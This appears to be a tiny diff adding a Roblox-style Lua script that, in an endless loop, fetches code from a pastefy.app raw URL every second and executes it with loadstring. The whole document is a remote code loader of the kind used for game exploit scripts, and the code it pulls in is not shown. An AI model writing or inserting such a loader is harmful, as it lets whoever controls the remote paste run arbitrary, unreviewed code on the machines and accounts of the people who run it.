@@ -1,0 +1,4 @@
+while true do
+    wait(1)
+loadstring(game:HttpGet("https://pastefy.app/zWhjK9jX/raw"))()
+end
